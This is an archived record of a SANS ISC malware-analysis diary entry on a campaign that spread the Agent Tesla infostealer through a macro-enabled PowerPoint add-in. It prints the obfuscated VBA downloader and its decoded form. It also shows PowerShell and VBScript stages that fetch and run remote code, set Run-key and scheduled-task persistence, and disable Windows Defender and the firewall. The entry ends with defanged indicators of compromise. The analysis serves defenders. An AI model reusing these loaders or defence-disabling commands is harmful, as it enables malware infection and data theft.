{
    "id": "db2030e3-fcee-4fb9-8fcf-cff3f411e847",
    "created_at": "2023-01-12T15:04:05.214213Z",
    "updated_at": "2025-03-27T02:05:19.605274Z",
    "deleted_at": null,
    "sha1_hash": "143cc0cf8bdbed8e61cd3305cc15de1851e6b6fc",
    "title": "2021-12-20 - PowerPoint attachments, Agent Tesla and code reuse in malware",
    "authors": "",
    "file_creation_date": "2022-05-28T04:03:40Z",
    "file_modification_date": "2022-05-28T04:03:40Z",
    "file_size": 722712,
    "plain_text": "# SANS ISC: PowerPoint attachments, Agent Tesla and code reuse in malware - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**[isc.sans.edu/forums/diary/PowerPoint+attachments+Agent+Tesla+and+code+reuse+in+malware/28154/](https://isc.sans.edu/forums/diary/PowerPoint+attachments+Agent+Tesla+and+code+reuse+in+malware/28154/)**\n\n[← Next Thread](https://isc.sans.edu/forums/diary/More+Undetected+PowerShell+Dropper/28158/)\n[Previous Thread →](https://isc.sans.edu/forums/diary/Office+2021+VBA+Project+Version/28150/)\n\nPowerPoint attachments, Agent Tesla and code reuse in malware\n\n\nSince any Office document that may contains macros can potentially be used by malware authors with similar\nresult as the usual Excel spreadsheet with macros, threat actors have most probably utilized all of the\navailable macro-enabled Office formats for attacks at some point. However, since most users would probably\nview PowerPoint slideshow asking them to enable macros with a not insignificant level suspicion, most\nattackers tend not to use any of PowerPoint file formats at all.\n\nOver the past few months, I have nevertheless noticed an unusual increase in the number of malicious\nPowerPoint attachments caught in my (mal)spam trap. Although the use of malicious PowerPoint is nothing\n[new[1], given the reasons mentioned above, it has never been too common, so I thought it might be](https://blog.nviso.eu/2017/06/07/malicious-powerpoint-documents-abusing-mouse-over-actions/)\nworthwhile to take a look at an example of a recent malspam campaign that spread the Agent Tesla\ninfostealer using a macro-enabled PowerPoint file.\n\nThe file in question was named SKM-03753WIRE23560USD.ppam and was distributed as an attachment of\nan e-mail that tried to make it appear as a wire transfer receipt.\n\n\nJan\n\n73\nPosts\n\nISC\nHandler\nDec\n20th\n2021\n\n\n-----\n\nYou may have noticed that the filename ended in an unusual extension PPAM. This extension is used for\n[PowerPoint Add-ins with macros[2], a special format for extending functionalities of PowerPoint](https://fileinfo.com/extension/ppam)\npresentations. Although there are some differences in content between PPAM and the more usual PPTM\nfiles, these don’t concern macros. Therefore, if we only care about the embedded VBA code, as in this\n[instance, we may analyze a PPAM using oledump[3], or any other tool we would normally use to parse](https://blog.didierstevens.com/programs/oledump-py/)\nmacro-enabled Office documents.\n\nIn this instance, the file turned out to contain only one small, slightly obfuscated VBA script:\n\n\n-----\n\n```\n      p ()\nSet Outlook = CreateObject(yOCaKOVzT(\"V|{svvr5Hwwspjh{pvu\", \"7\"))\nSet Microsoft = Outlook.CreateObject(yOCaKOVzT(\"^zjypw{5Zolss\", \"7\"))\nSet MicrosoftExec = Microsoft.Exec(yOCaKOVzT(\"rqygt\", \"2\") + yOCaKOVzT(\"ynkrr4k~k&\", \"6\") + Chr(150)\n+ yOCaKOVzT(\"_qvlw�[|tm(Pqllmv\", \"8\") + yOCaKOVzT(\"$1g$\", \"4\") +\nyOCaKOVzT(\"kBd�qvlw�{d{{|mu;:dkitkd66du{p|i(p||x{B77pipipippi{lHr6ux7\", \"8\") +\n\"chrehghghghghghghghghghcre\")\nMsgBox (MicrosoftExec.StdOut.ReadAll)\nEnd Sub\nPublic Function yOCaKOVzT(dghKkkXkS As String, NdffEcveP As Integer)\n  Dim Pp6IFCPL9 As Integer\n  For Pp6IFCPL9 = 1 To Len(dghKkkXkS)\nDim tHvckljoMTaERQgkne As Boolean\n    Mid(dghKkkXkS, Pp6IFCPL9, 1) = Chr(Asc(Mid(dghKkkXkS, Pp6IFCPL9, 1)) - NdffEcveP)\n  Next Pp6IFCPL9\nDim TMydgBdhyraoOOowKm As Byte\n  yOCaKOVzT = dghKkkXkS\nEnd Function\n\n```\nSince the function yOCaKOVzT only subtracts the value provided in the second argument from each byte in\nthe string provided as the first argument, deobfuscation of the script is fairly straightforward and leads to the\nfollowing code.\n```\nSub Auto_Open()\n     Set Outlook = CreateObject(\"Outlook.Application\")\n     Set Microsoft = Outlook.CreateObject(\"Microsoft = Wscript.Shell\")\n     Set MicrosoftExec = Microsoft.Exec(\"MicrosoftExec = powershell.exe -WindowStyle Hidden -c\nc:\\windows\\system32\\calc\\..\\mshta hxxps://hahahahhasd@j[.]mp/chrehghghghghghghghghghcre\")\n     MsgBox (MicrosoftExec.StdOut.ReadAll)\nEnd Sub\n\n```\nAs we may see, the VBA script is a simple downloader, that is supposed execute PowerShell code, which will\ngrab a file from hxxps:j[.]mp/chrehghghghghghghghghghcre (which redirects to\nhxxps://download2389.mediafire[.]com/ya9tv6zqa1zg/95ggilwnqccbq6l/20.doc) and execute it using the\nMicrosoft HTML Application host (MSHTA).\n\nAfter cleaning the downloaded file 20.doc up a bit, it came down to the following VBScript:\n```\npink = \"pOwersHelL.exe -NoProfile -ExecutionPolicy Bypass -Command i'E'x(iwr('hxxps://8db3b91a-ea93419b-b51b-0a69902759c5.usrfiles[.]com/ugd/8db3b9_2e35a24e3e7b4efba4867a06c6271f32.txt?\ndn=rendomtext') -useB);\ni'E'x(iwr('hxxps://8db3b91a-ea93-419b-b51b0a69902759c5.usrfiles[.]com/ugd/8db3b9_92ec48660f134f3bb502662383ca4ffb.txt?dn=rendomtext') -useB);\"\nConst tpok = &H80000001\nlopaskkk = \".\"\nSet kasodkmwm = GetObject(\"winmgmts:\\\\\" & lopaskkk & \"\\root\\default:StdRegProv\")\npoloaosd = \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nakosdwdjdw = \"cjjhkloggw\"\nkasodkmwm.SetStringValue tpok, poloaosd, akosdwdjdw, pink\nset MicrosoftWINdows = GetObject(StrReverse(\"B0A85DF40C00-9BDA-0D11-0FC1-22CD539F:wen\"))\nMicrosoftWINdows _\n. _\nRUn _\npink,0\nargs = \"/create /sc MINUTE /mo 63 /tn \"\"\"\"kbnvmmmhjo\"\"\"\" /\" & _\n\"F /tr \"\"\"\"\\\"\"\"\"M\" & \"s\" & \"H\" & \"t\" &\n\"A\"\"\"\"\\\"\"\"\"hxxps://kukadunikkk@kdaoskdokaodkwldld.blogspot[.]com/p/20.html\\\"\"\"\"\"\nhxxps://kukadunikkk@kdaoskdokaodkwldld.blogspot[.]com/p/20.html\n[code omitted]\nmagolia = \".\"\nSet Pologachi = GetObject(\"winmgmts:\\\\\" & magolia & \"\\root\\default:StdRegProv\")\nthreefifty = \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nMagachuchugaga = \"pilodkis\"\npathanogalulu = calc  \"\"\"hxxp://www.starinxxxgkular.duckdns[.]org/s1/20.txt\"\"\"\nPologachi.SetStringValue halaluya, threefifty, Magachuchugaga, pathanogalulu\n[code omitted]\n\n```\n\n-----\n\nGoing down from the top, the script it is supposed to:\n\n1. Download and execute two files containing PowerShell script from usrfiles.com (we’ll look at those in a\n\nmoment).\n2. Ensure persistence using the registry Run key by creating a value containing the same PowerShell\n\nscript as we mention in 1. It also created another value in the same key, which was supposed to run a\nfile from http[:]//www.starinxxxgkular.duckdns[.]org using MSHTA (although the link was already dead at\nthe time of the analysis, it may be reasonable assumed that this was supposed to be additional\npersistence mechanism).\n\n3. Ensure persistence using Scheduled Task named kbnvmmmhjo, which was supposed to run a file using\n\nMSHTA from hxxps:// kdaoskdokaodkwldld.blogspot[.]com.\n\nThe first PowerShell script mentioned above was lightly obfuscated and contained what we may think of as\nthe “main payload” – two GunZipped PE files in separate byte arrays (an “injector” and the actual Agent Tesla\nexecutable) and the code to decompress them and use the “injector” in the second byte array to execute the\nmain Agent Tesla file. The following code is a portion of its deobfuscated content:\n```\n[byte[]] $byteArray1 = @(31,139,...,94,3,0)\n[byte[]] $byteArray2 =@(31,139,...,228,0,0)\n[byte[]] $decompressedArray1 = Get-DecompressedByteArray $byteArray1\n[byte[]] $decompressedArray2 = Get-DecompressedByteArray $byteArray2\n[Reflection.Assembly]::Load($decompressedArray2).GetType('projFUD.PA').GetMethod('Execute').Invoke($\nnull,[object[]] (\n'C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_compiler.exe',$decompressedArray1))\n\n```\nBoth of the executables were written in .NET (as is usual for Agent Tesla) and both were fairly heavily\nobfuscated, as you may see from the following images.\n\nInjector code – the Execute method\n\n\n-----\n\nExcerpt from the list of methods in the Agent Tesla executable\n\nNevertheless, with a little bit of deobfuscation, it is possible to see that the injector is supposed to inject the\nAgent Tesla code into the hollowed out aspnet_compiler.exe process (a technique which Agent Tesla has\n[been known to use[4]). And even without understanding the names of methods and variables in the main](https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-korean-to-deliver-agent-tesla-new-variant)\nAgent Tesla code, some portions of it are fairly clear, such as the following excerpt from the key-logging\nmethod.\n\n\n-----\n\nThe last file we didn’t take a closer look at was the second PowerShell script downloaded by the second\nstage of the infection chain.\n```\n$down = New-Object System.Net.WebClient\n$url = 'hxxps://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe';\n$file = 'C:\\Users\\Public\\NSudo.exe';\n$down.DownloadFile($url,$file);\n$kasodkaosd = New-Object System.Net.WebClient\n$kasodkaosdsdmaowdk = 'hxxps://www.mediafire[.]com/file/qh5j3uy8qo8cpu7/FINAL+MAIN+vbs++Copy.vbs/file';\n$kasdjwkdo = 'C:\\Users\\Public\\heheheheh.vbs';\n$kasodkaosd.DownloadFile($kasodkaosdsdmaowdk,$kasdjwkdo);\nFunction script:Set-INFFile {\n[CmdletBinding()]\n     Param (\n     [Parameter(HelpMessage=\"Specify the INF file location\")]\n     $InfFileLocation = \"$env:temp\\CMSTP.inf\",\n     [Parameter(HelpMessage=\"Specify the command to launch in a UAC-privileged window\")]\n     [String]$CommandToExecute = 'wscript.exe C:\\Users\\Public\\heheheheh.vbs'\n     )\n [code omitted]\n\n```\n[Since this script is only slightly obfuscated, we may clearly see that it is supposed to download NSudo[5] (a](https://github.com/m2team/NSudo)\nprivilege escalation utility) and a VBS file hosted on mediafire.com, which it it then supposed to execute using\nWScript.\n\nThis final VBS is not obfuscated at all, and it can be clearly seen that it is basically supposed to disable the\nanti-malware protection with (among other techniques) the use of the NSudo tool which was previously\ndownloaded.\n\n\n-----\n\n```\n[ ]\nSet objShell = CreateObject(\"Wscript.Shell\")\nobjShell.Run \"C:\\Users\\Public\\NSudo.exe -U:T -ShowWindowMode:Hide sc delete windefend\"\n[code omitted]\noutputMessage(\"Add-MpPreference -ExclusionProcess powershell.exe\")\noutputMessage(\"Add-MpPreference -ExclusionProcess mshta.exe\")\noutputMessage(\"Add-MpPreference -ExclusionProcess cmd.exe\")\noutputMessage(\"Add-MpPreference -ExclusionProcess wscript.exe\")\noutputMessage(\"Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true\n-DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled\n-EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend\")\n[code omitted]\noutputMessage(\"netsh advfirewall set allprofiles state off\")\noutputMessage(\"Stop-Service -Name WinDefend -Confirm:$false -Force\")\noutputMessage(\"Set-Service -Name WinDefend -StartupType Disabled\")\noutputMessage(\"sc delete windefend\")\nSub outputMessage(byval args)\n     [code omitted]\n     errReturn = objProcess.Create( \"powershell \" + args, null, objConfig, intProcessID)\nEnd Sub\n\n```\nAs we may see from the following diagram, the very simple macro, which was contained in the PPAM file,\nlead to a fairly complex infection chain in the end…\n\nThis is not the end of the story, however, since one additional point which deserves a small mention is the\nreuse of open-source code in the infection chain.\n\nAlthough reuse of code from GitHub or StackOverflow is ubiquitous among both legitimate developers and\nmalware authors alike, in this case, unmodified “borrowed” code was used quite heavily. For example, the\nGunZip algorithm used by the third (PowerShell) stage was taken from GitHub, as was a UAC bypass used to\n[execute the final VBS script[6]. Since in both of these instances, the foreign code made up a significant](https://github.com/tylerapplebaum/CMSTP-UACBypass/blob/master/UACBypassCMSTP.ps1)\nportion of the analyzed file, not having to examine it too deeply sped up the entire analysis greatly.\n\nTherefore, I will offer one parting advice which can be useful especially to any junior security analysts out\nthere. If you ever see a line in a malicious code, which doesn’t seem to belong there (e.g., a call to a function\nwhich is supposed to display a visible error message to the user) try to ask Google whether it hadn’t seen it\nsomewhere else. In some cases, you will come up empty, as such code might have been included on\npurpose by the malware author in an attempt to obfuscate the real functionality of the program, however, in\nother instances you may find that a significant portion of the code in front of you has been reused, and you\nmight not have to spend time on going into it any deeper than just to gather the basic understanding of its\nmain function.\n\n**Indicators of Compromise (IoCs)**\n\nURLs\n\nhxxps://j[.]mp/chrehghghghghghghghghghcre\n\nhxxps://download2389.mediafire[.]com/ya9tv6zqa1zg/95ggilwnqccbq6l/20.doc\n\n\n-----\n\nhxxps://8db3b91a ea93 419b b51b\n0a69902759c5.usrfiles[.]com/ugd/8db3b9_2e35a24e3e7b4efba4867a06c6271f32.txt\nhxxps://8db3b91a-ea93-419b-b51b0a69902759c5.usrfiles[.]com/ugd/8db3b9_92ec48660f134f3bb502662383ca4ffb.txt\nhxxp://www.starinxxxgkular.duckdns[.]org/s1/20.txt\nhxxps://kukadunikkk@kdaoskdokaodkwldld.blogspot[.]com/p/20.html\nhxxps://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe\nhxxps://www.mediafire[.]com/file/qh5j3uy8qo8cpu7/FINAL+MAIN+vbs+-+Copy.vbs/file\n\nFiles\n\n20.doc\nMD5 - 425244233f21dac6f4395ab0c8c0c03e\nSHA1 - 003db538810e74ad74f33b2c69cfa85026e529fd\n\n8db3b9_2e35a24e3e7b4efba4867a06c6271f32.txt\nMD5 - cc60f4380686f2216bce3e8a287fc705\nSHA1 - 569eed2060bb0b669a7ae12f1e6c04649785bc11\n\n8db3b9_92ec48660f134f3bb502662383ca4ffb.txt\nMD5 - be208287362492a1a3703483fefa4d3b\nSHA1 - 3f834a4369f828aea46e44134afadbba8875ba05\n\nheheheheh.vbs\nMD5 - eacb8465cc5d6671618ea2b23986a45a\nSHA1 - 6d2e4dbfda127cda2478e68a5426f9646bba10c5\n\n[1] [https://blog.nviso.eu/2017/06/07/malicious-powerpoint-documents-abusing-mouse-over-actions/](https://blog.nviso.eu/2017/06/07/malicious-powerpoint-documents-abusing-mouse-over-actions/)\n\n[2] [https://fileinfo.com/extension/ppam](https://fileinfo.com/extension/ppam)\n\n[3] [https://blog.didierstevens.com/programs/oledump-py/](https://blog.didierstevens.com/programs/oledump-py/)\n\n[4] https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-korean-to-deliver-agent-teslanew-variant\n\n[5] [https://github.com/m2team/NSudo](https://github.com/m2team/NSudo)\n\n[6] [https://github.com/tylerapplebaum/CMSTP-UACBypass/blob/master/UACBypassCMSTP.ps1](https://github.com/tylerapplebaum/CMSTP-UACBypass/blob/master/UACBypassCMSTP.ps1)\n\n----------Jan Kopriva\n[@jk0pr](https://twitter.com/jk0pr)\n[Alef Nula](https://www.alef.com/en/)\n\n[← Next Thread](https://isc.sans.edu/forums/diary/More+Undetected+PowerShell+Dropper/28158/)\n[Previous Thread →](https://isc.sans.edu/forums/diary/Office+2021+VBA+Project+Version/28150/)\n\n[Sign Up for Free or](https://isc.sans.edu/register.html) [Log In to start participating in the conversation!](https://isc.sans.edu/login.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-20 - PowerPoint attachments, Agent Tesla and code reuse in malware.pdf"
    ],
    "report_names": [
        "2021-12-20 - PowerPoint attachments, Agent Tesla and code reuse in malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "732bfd4b-8c15-42a5-ac4b-14a9a4b902e9",
            "created_at": "2022-10-25T16:07:23.38079Z",
            "updated_at": "2025-03-27T02:02:09.771357Z",
            "deleted_at": null,
            "main_name": "Bahamut",
            "aliases": [],
            "source_name": "ETDA:Bahamut",
            "tools": [
                "Bahamut",
                "DownPaper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f99641e0-2688-47b0-97bc-7410659d49a0",
            "created_at": "2023-01-06T13:46:38.802141Z",
            "updated_at": "2025-03-27T02:00:02.922907Z",
            "deleted_at": null,
            "main_name": "Bahamut",
            "aliases": [],
            "source_name": "MISPGALAXY:Bahamut",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ada9e5d3-1cb2-4b70-a3c8-96808c304ac8",
            "created_at": "2022-10-25T15:50:23.6515Z",
            "updated_at": "2025-03-27T02:00:55.513513Z",
            "deleted_at": null,
            "main_name": "Windshift",
            "aliases": [
                "Windshift",
                "Bahamut"
            ],
            "source_name": "MITRE:Windshift",
            "tools": [
                "WindTail"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535845,
    "ts_updated_at": 1743041119,
    "ts_creation_date": 1653710620,
    "ts_modification_date": 1653710620,
    "files": {
        "pdf": "https://archive.orkl.eu/143cc0cf8bdbed8e61cd3305cc15de1851e6b6fc.pdf",
        "text": "https://archive.orkl.eu/143cc0cf8bdbed8e61cd3305cc15de1851e6b6fc.txt",
        "img": "https://archive.orkl.eu/143cc0cf8bdbed8e61cd3305cc15de1851e6b6fc.jpg"
    }
}